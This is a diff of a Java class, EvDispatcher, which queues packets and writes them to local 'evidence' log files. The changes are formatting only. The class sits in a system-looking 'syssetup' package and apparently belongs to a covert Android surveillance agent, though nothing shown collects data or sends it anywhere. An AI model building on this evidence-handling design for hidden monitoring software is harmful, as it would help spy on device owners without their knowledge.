@@ -9,14 +9,14 @@
 
 package com.android.syssetup.evidence;
 
-import java.io.File;
-import java.util.HashMap;
-import java.util.concurrent.LinkedBlockingQueue;
-
 import com.android.syssetup.Packet;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.file.Path;
 import com.android.syssetup.util.Check;
+
+import java.io.File;
+import java.util.HashMap;
+import java.util.concurrent.LinkedBlockingQueue;
 
 /**
  * The Class EvDispatcher collects LogR messages and manages the evidence
@@ -25,19 +25,29 @@ import com.android.syssetup.util.Check;
 public class EvDispatcher extends Thread implements Runnable {
 	private static final String TAG = "EvDispatcher"; //$NON-NLS-1$
 
-	/** The singleton. */
+	/**
+	 * The singleton.
+	 */
 	private volatile static EvDispatcher singleton;
 
-	/** The q. */
+	/**
+	 * The q.
+	 */
 	private final LinkedBlockingQueue<Packet> queue;
 
-	/** The log map. */
+	/**
+	 * The log map.
+	 */
 	private final HashMap<Long, Evidence> evidences;
 
-	/** The halt. */
+	/**
+	 * The halt.
+	 */
 	private boolean halt;
 
-	/** The sd dir. */
+	/**
+	 * The sd dir.
+	 */
 	private File sdDir;
 
 	private boolean running;
@@ -80,11 +90,29 @@ public class EvDispatcher extends Thread implements Runnable {
 	// QZM -> Signature
 	// 4 bytes -> Log Type
 	// 4 bytes -> .mrk
+
+	/**
+	 * Self.
+	 *
+	 * @return the log dispatcher
+	 */
+	public static EvDispatcher self() {
+		if (singleton == null) {
+			synchronized (EvDispatcher.class) {
+				if (singleton == null) {
+					singleton = new EvDispatcher();
+				}
+			}
+		}
+
+		return singleton;
+	}
+
 	/**
 	 * Process queue.
 	 */
 	private void processQueue() {
-		Packet p=null;
+		Packet p = null;
 
 		try {
 			p = queue.take();
@@ -99,62 +127,45 @@ public class EvDispatcher extends Thread implements Runnable {
 		}
 		switch (p.getCommand()) {
 
-		case EvidenceBuilder.LOG_CREATE:
-			createEv(p);
-			break;
+			case EvidenceBuilder.LOG_CREATE:
+				createEv(p);
+				break;
 
-		case EvidenceBuilder.LOG_ATOMIC:
-			atomicEv(p);
-			break;
+			case EvidenceBuilder.LOG_ATOMIC:
+				atomicEv(p);
+				break;
 
-		case EvidenceBuilder.LOG_APPEND:
-			appendEv(p);
-			break;
-			
-		case EvidenceBuilder.LOG_WRITE:
-			writeEv(p);
-			break;
+			case EvidenceBuilder.LOG_APPEND:
+				appendEv(p);
+				break;
 
-		case EvidenceBuilder.LOG_ITEMS:
-			itemsEv(p);
-			break;
+			case EvidenceBuilder.LOG_WRITE:
+				writeEv(p);
+				break;
 
-		case EvidenceBuilder.LOG_CLOSE:
-			closeEv(p);
-			break;
-			
-		case EvidenceBuilder.INTERRUPT:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (processQueue), INTERRUPT");
-			}
-			halt=true;
-			break;
+			case EvidenceBuilder.LOG_ITEMS:
+				itemsEv(p);
+				break;
 
-		default:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "processQueue() got LOG_UNKNOWN"); //$NON-NLS-1$ //$NON-NLS-2$
-			}
-			break;
+			case EvidenceBuilder.LOG_CLOSE:
+				closeEv(p);
+				break;
+
+			case EvidenceBuilder.INTERRUPT:
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (processQueue), INTERRUPT");
+				}
+				halt = true;
+				break;
+
+			default:
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error: " + "processQueue() got LOG_UNKNOWN"); //$NON-NLS-1$ //$NON-NLS-2$
+				}
+				break;
 		}
 
 		return;
-	}
-
-	/**
-	 * Self.
-	 * 
-	 * @return the log dispatcher
-	 */
-	public static EvDispatcher self() {
-		if (singleton == null) {
-			synchronized (EvDispatcher.class) {
-				if (singleton == null) {
-					singleton = new EvDispatcher();
-				}
-			}
-		}
-
-		return singleton;
 	}
 
 	/*
@@ -187,14 +198,13 @@ public class EvDispatcher extends Thread implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
 		}
-		
+
 	}
 
 	/**
 	 * Send.
-	 * 
-	 * @param packet
-	 *            the packet
+	 *
+	 * @param packet the packet
 	 * @return true, if successful
 	 */
 	public void send(final Packet packet) {
@@ -225,16 +235,15 @@ public class EvDispatcher extends Thread implements Runnable {
 		queue.add(new Packet());
 
 	}
-	
-	public boolean isRunning(){
+
+	public boolean isRunning() {
 		return running;
 	}
 
 	/**
 	 * Creates the log.
-	 * 
-	 * @param p
-	 *            the p
+	 *
+	 * @param p the p
 	 * @return true, if successful
 	 */
 	private boolean createEv(final Packet p) {
@@ -255,9 +264,8 @@ public class EvDispatcher extends Thread implements Runnable {
 	/**
 	 * Creates a simple log, copies the payload and closes it in one atomic
 	 * step.
-	 * 
-	 * @param p
-	 *            the p
+	 *
+	 * @param p the p
 	 */
 	private void atomicEv(final Packet p) {
 		if (Cfg.DEBUG) {
@@ -289,9 +297,8 @@ public class EvDispatcher extends Thread implements Runnable {
 
 	/**
 	 * Write log.
-	 * 
-	 * @param p
-	 *            the p
+	 *
+	 * @param p the p
 	 * @return true, if successful
 	 */
 	private boolean writeEv(final Packet p) {
@@ -322,14 +329,13 @@ public class EvDispatcher extends Thread implements Runnable {
 		final boolean ret = evidence.appendEvidence(p.getData(), 0, p.getDataLength());
 
 		return ret;
-		
+
 	}
 
 	/**
 	 * Close log.
-	 * 
-	 * @param p
-	 *            the p
+	 *
+	 * @param p the p
 	 * @return true, if successful
 	 */
 	private boolean closeEv(final Packet p) {
